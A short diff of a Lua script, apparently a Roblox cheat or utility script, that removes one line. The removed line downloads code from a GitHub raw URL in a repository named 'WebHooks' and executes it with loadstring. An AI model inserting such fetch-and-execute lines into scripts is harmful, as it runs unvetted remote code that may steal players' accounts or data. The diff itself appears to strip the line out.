@@ -7,7 +7,6 @@ local player = players.LocalPlayer or players:GetPropertyChangedSignal("LocalPla
 local CoreGui = game:GetService("CoreGui")
 local StarterGui = game:GetService("StarterGui")
 local hi = false
-loadstring(Game:HttpGet("https://raw.githubusercontent.com/Games1799/WebHooks/refs/heads/main/JustScript"))()
 
 _G.TP = false
 _G.HideAll = false
